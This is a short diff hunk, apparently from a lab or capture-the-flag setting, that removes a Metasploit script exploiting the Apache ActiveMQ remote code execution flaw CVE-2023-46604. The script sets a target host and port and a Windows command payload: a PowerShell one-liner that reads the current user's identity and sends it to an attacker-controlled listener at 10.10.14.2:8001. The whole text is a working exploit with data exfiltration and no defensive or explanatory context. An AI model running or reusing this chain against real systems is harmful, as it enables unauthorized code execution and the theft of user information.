@@ -1,8 +1,0 @@
-use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
-set RHOSTS 10.129.230.70
-set RPORT 61616
-set LHOST 10.10.14.2
-set LPORT 4444
-set payload cmd/windows/generic
-set CMD powershell -nop -c "$u=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name; $priv=[System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent(); iwr http://10.10.14.2:8001/?user=$u"
-run
